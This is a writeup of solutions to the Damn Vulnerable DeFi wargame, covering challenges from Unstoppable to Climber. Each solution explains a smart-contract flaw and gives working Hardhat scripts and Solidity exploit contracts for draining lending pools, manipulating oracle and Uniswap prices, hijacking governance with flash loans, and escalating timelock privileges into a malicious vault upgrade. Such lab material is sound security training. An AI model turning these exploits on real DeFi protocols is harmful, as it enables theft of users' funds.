# $ Damn Vulnerable DeFi - Writeups     
Damn Vulnerable DeFi is the wargame to learn offensive security of DeFi smart contracts.
Throughout numerous challenges you will build the skills to become a bug hunter or security auditor in the space.  

This are writeups of my own solutions of all the challenges posted up to date. My solutions might not be the best 
implementations but all of them show proof of the exploitable techniques.  

I'll encourage everyone to give a good try to all the challenges before taking a peak at the following solutions.

## Unstoppable  <a name="unstoppable"></a>  
 There's a lending pool with a million DVT tokens in balance, offering flash loans for free.

 If only there was a way to attack and stop the pool from offering flash loans ...

 You start with 100 DVT tokens in balance.

## Exploit 
In this challenge, the ``UnstoppableLender.sol`` smart contract has a vulnerability that 
we can exploit in order to stop the free flashloans.  

The smart contract uses a variable to keep track of the balance of the pool called 
``poolBalance``. This variable is updated every time the ``depositTokens()`` is executed 
trying to keep track of the pool dvt tokens balance. But, there's only one problem and it's 
that we can use the dvt token transfer function to transfer dvt tokens to the smart contract 
and that ``poolBalance`` variable will not update.  

Knowing that, in the ``flashloan()`` I see that it checks for any discrepancies in the ``poolBalance`` 
variable and the real balance of the address of the tokens in: ``assert(poolBalance == balanceBefore)``.  
So, updating the balance of dvt tokens of the smart contract address without updating ``poolBalance`` variable 
will cause the ``flashloan()`` to stop issuing free loans.

```js
	it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
         // Show it's possible for someUser to take out a flash loan
		 await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
	});
```

## Naive receiver <a name="naive_reciever"></a>  
 There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

 You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

 Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;) 

## Exploit 
The user contract ``FlashLoanReceiver.sol`` is not checking the ``msg.value`` variable 
when ``recieveEther()`` is called. That way, we can drain his contract by passing a 0 value and 
collecting the ``1 ether`` FEE from the user's contract.   

```js
	it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   
		while(await ethers.provider.getBalance(this.receiver.address) != 0){
			await this.pool.flashLoan(this.receiver.address, 0)
		}
    });
```

## Truster <a name="truster"></a>   
 More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

 Currently the pool has 1 million DVT tokens in balance. And you have nothing.

 But don't worry, you might be able to take them all from the pool. In a single transaction.

## Exploit
In this challenge, the smart contract is vulnerable to delegatecall, where the attacker can 
execute some logic functionality on behalf of the smart contract in the ``target.functionCall(data)`` 
on line 36 on the ``flashloan()``.  

Knowing this, we can send some data to the ``flashLoan()`` to approve the attacker to tranfer 
himself any amount of funds, draining the contract.   
 
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
		const abi = [
			"function approve(address spender, uint256 amount) external returns (bool)",
			"function transfer(address to, uint amount)"
		];
		const iface = new ethers.utils.Interface(abi);
		const data = iface.encodeFunctionData("approve", [attacker.address, ethers.utils.parseEther('100000000')]);
		await this.pool.flashLoan(0, attacker.address, this.token.address, data);
		this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, ethers.utils.parseEther('1000000'));
    });
```

## Side entrance <a name="side_entrance"></a>   
 A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

 This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

 You must take all ETH from the lending pool. 

## Exploit 
In this challenge we can increase the amount of our balance in pool executing a 
flashloan and making a deposit with that money. This way, we increase our ``balance`` 
without really using any of our ETH and we can withdraw that to the attacker's account 
later.  

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILendingPool {
	function deposit() external payable;
	function withdraw() external;
	function flashLoan(uint256 amount) external;
}

contract Exploit {
	address attacker;
	ILendingPool pool;
	event Received(address, uint);

	function exec(address _contract) external {
		attacker = msg.sender;
		pool = ILendingPool(_contract);
		pool.flashLoan(1000 ether);
	}

	function withdraw() external {
		pool.withdraw();
		payable(attacker).transfer(address(this).balance);	
	}

	fallback() external payable {
		pool.deposit{value: msg.value}();
	}
	receive() external payable {
		emit Received(msg.sender, msg.value);
	}
}
```
Execution: 
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
		await this.exploit.exec(this.pool.address);
		await this.exploit.withdraw();
    });
```

## The rewarder <a name="the_rewarder"></a>
 There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

 Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

 You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

 Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans? 

## Exploit 
In this challenge we can use the flashloan, to mint the attacker free rewardTokens by modifying 
the transaction timestamp and calling the ``distributeRewards()`` before returning the flashloan. 
Therefore, we can mint as an attacker free reward tokens.  
 
```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILendingPool {
	function flashLoan(uint256 amount) external;
}

interface IRewardsPool {
	function deposit(uint256 amountToDeposit) external;
	function withdraw(uint256 amountToWithdraw) external;
}

interface IDVT {
	function transfer(address to, uint256 amount) external returns (bool);
	function approve(address spender, uint256 amount) external returns (bool);
}

interface IRewardToken {
	function transfer(address to, uint256 amount) external returns (bool);
	function balanceOf(address account) external view returns (uint256);
}

contract Exploit_TheReward {

	address attacker;
	ILendingPool lendingPool;
	IRewardsPool rewardsPool;	
	IRewardToken rewardToken;
	IDVT dvt;

	function exec(address _lendingPool, address _rewardsPool, address _dvt, address _rt) external {
		lendingPool = ILendingPool(_lendingPool);	
		rewardsPool = IRewardsPool(_rewardsPool);
		rewardToken = IRewardToken(_rt);
		dvt = IDVT(_dvt);
		attacker = msg.sender;
		lendingPool.flashLoan(1000000 ether);
	}
	
	function receiveFlashLoan(uint256 amount) external {
		dvt.approve(address(rewardsPool), amount);
		rewardsPool.deposit(amount);
		rewardsPool.withdraw(amount);
		dvt.transfer(address(lendingPool), amount);
		rewardToken.transfer(attacker, rewardToken.balanceOf(address(this))); 
	}
}

```
Execution: 
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
		await this.exploit.exec(
			this.flashLoanPool.address, 
			this.rewarderPool.address,
			this.liquidityToken.address,
			this.rewardToken.address
		);
    });
```

## Selfie <a name="selfie"></a>
A new cool lending pool has launched! It's now offering flash loans of DVT tokens.

Wow, and it even includes a really fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

## Exploit 
In this challenge, our goal is to execute the ``drainAllFunds()`` from the SelfiePool. In order to do 
that, we'll have to execute that from the governance contract. Looking at the Governance contract, we 
can execute an action as long as we have enough votes which we can get through the flashloan and that way 
we can drain all the funds.  

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ISelfie {
	function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
	function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
	function executeAction(uint256 actionId) external payable;
}

interface IToken {
	function getBalanceAtLastSnapshot(address account) external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function snapshot() external returns (uint256);
	function transfer(address to, uint256 amount) external returns (bool);
}

contract Exploit_Selfie {
	ISelfie pool;
	IGovernance governance;
	IToken token;
	address attacker;

	function exec(address _pool, address _governance, address _token) external {
		pool = ISelfie(_pool);
		governance = IGovernance(_governance);
		token = IToken(_token);
		attacker = msg.sender;
		pool.flashLoan(1500000 ether);
	}

	function receiveTokens(address _token , uint amount) external payable {
		bytes memory data = abi.encodeWithSignature('drainAllFunds(address)', attacker);
		token.snapshot();
		governance.queueAction(
			msg.sender,
			data,
			0 wei
		);
		token.transfer(msg.sender, amount);
	}
}
```
Execution: 
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
		await this.exploit.exec(this.pool.address, this.governance.address, this.token.address);
		await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
		await this.governance.executeAction(1, {value: ethers.utils.parseEther('1')});
    });
```

## Compromised <a name="compromised"></a>   
While poking around a web service of one of the most popular DeFi projects in the space, 
you get a somewhat strange response from their server. This is a snippet:

```
A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each

This price is fetched from an on-chain oracle, and is based on three trusted reporters:
 0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and 0x81A5D6E50C214044bE44cA0CB057fe119097850c.

Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.

## Step 1 - Looking at the contracts 
Taking a loook at the 3 contracts, at plain sight the only way I see I can manipulate 
the price of the oracles to drain the contract is if I make myself a TRUSTED_SOURCE_ROLE.  

After, realizing that, I took a look at the http response see what kind of data I could 
find. Decoding the bytes with https://onlinehextools.com/convert-hex-to-string I get a string 
text looking alike to a base64 encoded string. Decoding that base64 string, gives me 2 private
keys of the oracle source accounts with privilage to modify the price data.  

## Step 2 - Building exploit
Very simple, first we impersonate the TRUSTED_SOURCES account to change the price to 0 
so we can buy the nfts for free and again later to sell it for the amount balance of the exchange contract
in order to drain it.  
```js
		let privateKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
		let privateKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
		let wallet1 = new ethers.Wallet(privateKey1, ethers.provider);
		let wallet2 = new ethers.Wallet(privateKey2, ethers.provider);
		// Change price to 0
		await this.oracle.connect(wallet1).postPrice("DVNFT", 0);
		await this.oracle.connect(wallet2).postPrice("DVNFT", 0);
		// Buy free NFT
		const tx = await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther('0.01')});
		const reciept = await tx.wait()
		const tokenId = reciept.events[1].args.tokenId;
		// Drain Contract
		await this.oracle.connect(wallet1).postPrice("DVNFT", await ethers.provider.getBalance(this.exchange.address));
		await this.oracle.connect(wallet2).postPrice("DVNFT", await ethers.provider.getBalance(this.exchange.address));
		await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
		await this.exchange.connect(attacker).sellOne(tokenId);
		// Reset Price
		await this.oracle.connect(wallet1).postPrice("DVNFT", INITIAL_NFT_PRICE);
		await this.oracle.connect(wallet2).postPrice("DVNFT",INITIAL_NFT_PRICE);
``` 

## Puppet <a name="puppet"></a>  
There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool. 

## Manipulation of uniswap price
In order to be able to drain the lending pool contract we have to manipulate the amount of eth balance in the uniswap contract so we can borrow a big amount of DVT Tokens
with a very small deposit required.      
We can do that by exchanging a bunch of DVT tokens for 1 eth in order to make the eth balance as close to 0 as possible, so we can drain the lending pool contract.      

## Exploit
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).approve(
            this.uniswapExchange.address,
            ethers.utils.parseEther('1000'),
        );
		await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            ethers.utils.parseEther('999'),
			ethers.utils.parseEther('1'),
			(await ethers.provider.getBlock('latest')).timestamp * 2,
		);
		await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('25')});
    });
```

## Puppet v2 <a name="puppet_v2"></a>    
 The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!

 Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.

 You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)  

## Price Manipulation
For this new challenge, as well as the puppet v1 we have to drain the pool contract. In order to do that, 
we need to manipulate the price of WETH/DVT pair in uniswap v2. 

When we look at the contract, we can see that the getOracleQuote() although is using the uniswap v2 official libraries, it 
does the same operation as the puppet v1 and it's still subject to price manipulation. 
Therefore, we can still manipulate the price selling a bunch of DVT tokens and decreasing the amount of eth 
in liquidity. 

The main difference here, is that instead of sending ether, to the borrow function in the lending pool contract we have to send weth in order
to borrow DVT tokens. So, we'll have to exchange or DVT tokens for ETH in uniswap and then convert all our ETH to WETH and 
hope that we have a higher amount of WETH that the calculateDepositRequired() requires.

## Exploit 
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
		// Approve DVT
        await this.token.connect(attacker).approve(
            this.uniswapRouter.address,
            ethers.utils.parseEther('10000'),
        );
		//Swap tokens for ETH
		await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
			ATTACKER_INITIAL_TOKEN_BALANCE,
			0,
			[this.token.address, this.weth.address],
			attacker.address,
			(await ethers.provider.getBlock('latest')).timestamp * 2,
		);
		// Convert ETH to WETH
		const weth_required = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
		await this.weth.connect(attacker).deposit({value: weth_required});
		// Approve WETH
        await this.weth.connect(attacker).approve(
            this.lendingPool.address,
            weth_required,
        );
		// Drain Pool
		await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });
```

## Free rider <a name="free_rider"></a>    
 A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

 A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.

 You want to build some rep with this buyer, so you've agreed with the plan.

 Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.  

## Vulnerability
Looking at the FreeRiderNFTMarketplace.sol contract we can see there's a logical error in the buyOne().
There are 2 problems:    
1. Bad use of msg.value without updating it after the loop, that gives us the ability to get unlimited NFTs 
for the price of 1. (line 72)
2. Logical error on checking the ownerOf the NFT after transfering the token, as 
when the contract transfers the token it changes the ownership instantly from the seller to buyer.  
This is going to allow an attacker to extract funds from the contract. (line 80)

We start with 0.5 ether and in order to exploit the contract we need 15 eth so we need 
to find a way to get that money. That way is done using flash Swaps from uniswap v2. This will 
allow us to get a loan with the amount of money we need to get the NFTs as long as we pay it back. 

## Exploit 
In order to do this we need to craft our own exploitable contract.  

```sol
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

interface IDamnValuableNFT {
	function safeTransferFrom(address, address, uint) external;
}

interface IFreeRiderNFTMarketplace {
	function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH9 {
	function deposit() external payable;
	function withdraw(uint wad) external;
	function transferFrom(address src, address dst, uint wad) external returns (bool);
}

contract FREE_RIDER_EXPLOIT {

	address buyer;
	IUniswapV2Pair pair;
	IWETH9 weth;
	IFreeRiderNFTMarketplace marketplace;
	IUniswapV2Router02 router;
	IDamnValuableNFT nft;

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
		// Convert WETH to ETH
		weth.withdraw(amount0);
		// Init tokenIds
		uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
		// Steal NFTs
		marketplace.buyMany{value: amount0}(tokenIds);
		// Return Uniswap loan
		uint returnAmount = amount0 + 0.1 ether;
		weth.deposit{value: returnAmount}();
		weth.transferFrom(address(this), msg.sender, returnAmount);
		// Transfer NFTs to attacker
        for (uint256 i = 0; i < 6; i++) {
			nft.safeTransferFrom(address(this), address(buyer), i);	
		}
	}

	function exec(
		address _pair,
		address _token0,
		address _token1,
		address _marketplace,
		address _router,
		address _nft,
		address _buyer
	) external {
		buyer = _buyer;
		marketplace = IFreeRiderNFTMarketplace(_marketplace);
		weth = IWETH9(_token1); 
		router = IUniswapV2Router02(_router);
		nft = IDamnValuableNFT(_nft);
		pair = IUniswapV2Pair(_pair);
		// Get Flash loan for 15 WETH
		pair.swap(
			15 ether,
			0,
			address(this),
			bytes('not empty')
		);	
	}

    // Interface required to receive NFT as a Smart Contract
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
```  
Finnally, we just need to execute it and and see our balance grow.   

```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
		//Deploy Exploit 
		this.exploit = await (await ethers.getContractFactory('FREE_RIDER_EXPLOIT', attacker)).deploy();
		await this.exploit.exec(
			this.uniswapPair.address,
			this.token.address,
			this.weth.address, 
			this.marketplace.address,
			this.uniswapRouter.address,
			this.nft.address,
			this.buyerContract.address
		);
    });

```

## Backdoor <a name="backdoor"></a>
 To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.

 To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.

 Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

 Your goal is to take all funds from the registry. In a single transaction.   

## Gnosis Safe Backdoor injection
In this challenge, we have a vulnerable proxy which allows us to deploy a malicious 
smart contract executing some initializing code with full proxy admin privileges. That, is 
going to allow an attacker to steal the eth that the walletRegistry contract gives as a reward 
for a beneficiary to register.  

The challenge requires to craft the exploit fully in the smart contract in order to execute 
it in a single transaction. In my example there's multiple transactions as I craft the exploit 
mostly with ethersjs in the front-end.  

## Exploit 
In the smart contract I only approve the transfer of tokens:   
```sol
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Itoken {
	function approve(address,uint) external returns (bool);
}

contract EXPLOIT_BACKDOOR {
	function exec(address token, address attacker) external {
		Itoken(token).approve(attacker, 10 ether);
	}
}

```

## Climber <a name="climber"></a>
 There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.

 The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.

 On the vault there's an additional role with powers to sweep all tokens in case of an emergency.

 On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.

 Your goal is to empty the vault. 

## Privilege escalation 
In this challenge, we are able to escalate to admin privileges to execute admin level functions. 
The most important one beeing the ``upgradeToAndCall()`` in the UUPS proxy contract which enables an 
attacker to change the contract logic of the proxy contract and drain the funds manipulating the 
``sweepFunds()`` in the ``ClimberVault.sol`` smart contract.  

The exploit starts in the ``ClimberTimelock.sol`` smart contract as we have the ability to
delegatecall functions with the ``execute()``. In order to call this function we have to first 
schedule the tasks which require the sender to be part of a POSPONER_ROLE. Luckily, for us 
the execute() only checks if the tasks has been scheduled after all the tasks have been executed, beeing 
vulnerable to exploit. 

## Exploit Smart Contract Code
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Itimelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

	function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;
}

contract EXPLOIT_CLIMBER {
	Itimelock timelock;
	address[] targets;
	uint256[] values; 
	bytes[] dataElements;
	bytes32 salt;

	function exec(
		address _timelock, 
		address _vault,
		address _vaultV2,
		address _token
	) 
	external {
		// Update delay to 0
		targets.push(_timelock);
		values.push(0);
		dataElements.push(abi.encodeWithSignature("updateDelay(uint64)",0));

		// Add attacker to PROSPOSER_ROLE
		targets.push(_timelock);
		values.push(0);
		dataElements.push(
			abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"), address(this))
		);

		// Upgrade Contract
		targets.push(_vault);
		values.push(0);
		dataElements.push(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",
			_vaultV2,
			abi.encodeWithSignature("sweepFunds(address,address)", _token, msg.sender)
		));

		// Schedule tasks
		targets.push(address(this));
		values.push(0);
		dataElements.push(abi.encodeWithSignature("schedule()"));
		
		// Init contract
		salt = "sigkill9";
		timelock = Itimelock(_timelock);
		timelock.execute(targets, values, dataElements, salt); 
	}

	function schedule() external {
		timelock.schedule(targets, values, dataElements, salt);
	}
}

```
Finnally, execute the exploit.
```js
    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
		this.exploit = await (await ethers.getContractFactory('EXPLOIT_CLIMBER', attacker)).deploy();
		this.vaultV2 = await (await ethers.getContractFactory("ClimberVaultV2", attacker)).deploy();
		await this.exploit.exec(
			this.timelock.address, 
			this.vault.address,
			this.vaultV2.address,
			this.token.address
		);
    });
```
For the new smart contract I upload in ``ClimberVaultV2`` I only change the swapFunds() to drain the funds.  
```sol
    // Allows attacker to drain funds 
    function sweepFunds(address tokenAddress, address recipient) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, token.balanceOf(address(this))), "Transfer failed");
    }
```
